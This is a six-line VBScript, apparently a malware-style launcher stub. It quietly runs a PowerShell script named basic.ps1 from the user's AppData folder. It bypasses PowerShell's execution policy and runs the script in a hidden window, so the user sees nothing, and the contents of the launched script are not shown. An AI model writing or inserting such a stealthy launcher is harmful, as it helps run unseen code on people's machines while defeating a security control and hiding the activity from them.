Set WshShell = CreateObject("WScript.Shell")
hm = WshShell.ExpandEnvironmentStrings("%appdata%")
basic = hm & "\basic.ps1"
Set WshShell = CreateObject("WScript.Shell")
cmd="powershell -executionpolicy bypass -file " & basic
WshShell.Run cmd, 0, True